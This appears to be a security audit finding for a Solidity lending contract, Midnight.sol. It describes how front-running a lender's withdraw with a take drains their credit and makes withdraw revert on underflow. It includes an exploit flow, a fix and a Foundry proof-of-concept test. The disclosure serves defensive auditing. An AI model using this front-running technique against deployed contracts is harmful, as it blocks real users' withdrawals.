### Title
Withdraw reverts with arithmetic underflow when a concurrent take reduces seller credit below the requested withdraw units - (File: src/Midnight.sol)

### Summary

`withdraw` performs `_position.credit -= UtilsLib.toUint128(units)` at line 493 with no prior check that `units <= _position.credit`. Because `take` can legitimately reduce a sell-side maker's credit via `sellerCreditDecrease` in the same block, any taker can front-run a lender's pending `withdraw` transaction, driving the lender's credit below `units` and causing the Solidity 0.8.34 checked subtraction to revert.

### Finding Description

**Code path in `withdraw`** (`src/Midnight.sol:481-500`):

```
_updatePosition(market, id, onBehalf);          // may further reduce credit
...
_position.credit -= UtilsLib.toUint128(units);  // line 493 – no guard
_marketState.withdrawable -= UtilsLib.toUint128(units);
```

There is no `require(units <= _position.credit)` anywhere in `withdraw`.

**Code path in `take`** that reduces the seller's credit (`src/Midnight.sol:383, 413`):

```
uint256 sellerCreditDecrease = UtilsLib.min(units, sellerPos.credit);
...
sellerPos.credit -= UtilsLib.toUint128(sellerCreditDecrease);
```

`sellerCreditDecrease` is bounded by `sellerPos.credit`, so `take` itself never underflows. But it can reduce the seller's credit to any value in `[0, sellerPos.credit]`.

**Exploit flow:**

1. Lender has `position[id][lender].credit = C` and has posted a sell offer (`offer.buy = false`, `offer.maker = lender`) with `maxUnits >= C`.
2. Lender submits `withdraw(market, C, lender, lender)` to the mempool.
3. Attacker observes the pending transaction and front-runs with `take(offer, ..., C, attacker, ...)`.
4. `take` executes first: `sellerCreditDecrease = min(C, C) = C`; lender's credit becomes 0.
5. Lender's `withdraw` executes: `_updatePosition` runs (credit stays 0 or is further reduced by fees), then `_position.credit -= C` → arithmetic underflow → revert.

**Why existing checks do not stop it:**

- `take` has no cap preventing it from consuming all of a maker's credit.
- `withdraw` calls `_updatePosition` (which can only decrease credit further) but never asserts `units <= _position.credit`.
- `_marketState.withdrawable` is not decremented by `take`, so the market-level withdrawable check at line 494 does not catch the per-user credit shortfall.
- The Certora `withdrawEffects` rule (`certora/specs/BalanceEffects.spec:74`) asserts `creditOf == updatedUserCredit - units` but does not model the case where `units > updatedUserCredit`; the spec implicitly assumes valid inputs.

### Impact Explanation

Any lender who is simultaneously a sell-side maker can have their `withdraw` transaction griefed by any taker. The lender's transaction reverts; they must re-query their credit and resubmit. A determined attacker can repeat this every block for as long as the lender has an active sell offer, creating a sustained DoS against `withdraw` for that lender. The lender's funds are not stolen, but withdrawal is blocked until the offer is cancelled or fully consumed.

### Likelihood Explanation

**Preconditions:**
- Lender has an active sell offer (`offer.buy = false`, `offer.maker = lender`).
- Lender submits `withdraw(units)` where `units > 0` and the offer still has capacity.

Both conditions are routine in normal protocol usage. The attacker needs no special role and pays only gas plus the token cost of the take (which they receive credit for, so the net cost is low). The attack is repeatable every block and requires no coordination beyond mempool observation.

### Recommendation

Add an explicit check in `withdraw` after `_updatePosition` that `units` does not exceed the post-update credit:

```solidity
_updatePosition(market, id, onBehalf);
Position storage _position = position[id][onBehalf];
require(units <= _position.credit, InsufficientCredit());
```

Alternatively, use a saturating subtraction and emit the actual withdrawn amount, consistent with how `sellerCreditDecrease` is computed in `take`.

### Proof of Concept

```solidity
// Foundry unit test
function testFrontRunWithdrawUnderflow() public {
    uint256 credit = 100e18;

    // 1. Lender acquires credit via a take (lender is buyer)
    setupLender(credit, 0, 365 days);
    assertEq(midnight.creditOf(id, lender), credit);

    // 2. Lender posts a sell offer (offer.buy = false, maker = lender)
    Offer memory sellOffer = _makeSellOffer(credit, keccak256("sell-group"));

    // 3. Borrower repays so withdrawable >= credit
    deal(address(loanToken), borrower, credit);
    vm.prank(borrower);
    midnight.repay(market, credit, borrower, address(0), hex"");

    // 4. Attacker front-runs: takes the sell offer for full credit
    address attacker = makeAddr("attacker");
    deal(address(loanToken), attacker, credit);
    vm.prank(attacker);
    midnight.take(sellOffer, hex"", credit, attacker, attacker, address(0), hex"");

    // Lender's credit is now 0
    assertEq(midnight.creditOf(id, lender), 0);

    // 5. Lender's withdraw for original credit amount reverts
    vm.prank(lender);
    vm.expectRevert(); // arithmetic underflow on _position.credit -= units
    midnight.withdraw(market, credit, lender, lender);
}
```
